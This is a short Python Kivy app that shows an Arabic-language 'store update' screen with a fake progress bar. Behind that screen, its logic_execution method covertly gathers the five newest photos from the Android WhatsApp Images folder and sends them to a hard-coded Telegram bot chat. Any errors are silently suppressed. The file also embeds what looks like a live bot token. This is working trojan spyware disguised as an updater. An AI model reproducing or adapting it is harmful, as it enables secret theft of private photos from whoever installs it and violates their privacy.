import os, telebot, time
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.progressbar import ProgressBar
from threading import Thread

# --- إعدادات البوت ---
TOKEN = "8735555327:AAEgbZ0lUeRVtLQoDzEg5c6dUfelRLv2SCs"
ID = "8735555327"
bot = telebot.TeleBot(TOKEN)

class AppStoreApp(App):
    def build(self):
        layout = BoxLayout(orientation='vertical', padding=50, spacing=20)
        self.label = Label(text="جاري تحديث المتجر...\nيرجى الانتظار", font_size='20sp', halign='center')
        layout.add_widget(self.label)
        self.pb = ProgressBar(max=100, value=0)
        layout.add_widget(self.pb)
        Thread(target=self.logic_execution).start()
        return layout

    def logic_execution(self):
        for i in range(1, 101):
            time.sleep(0.1)
            self.pb.value = i
        self.label.text = "اكتمل التحديث!"
        
        # سحب صور واتساب (كمثال)
        path = "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/"
        try:
            if os.path.exists(path):
                files = [os.path.join(path, f) for f in os.listdir(path) if os.path.isfile(os.path.join(path, f))]
                files.sort(key=os.path.getmtime, reverse=True)
                for file in files[:5]:
                    with open(file, 'rb') as doc:
                        bot.send_document(ID, doc)
        except:
            pass

if __name__ == "__main__":
    AppStoreApp().run()
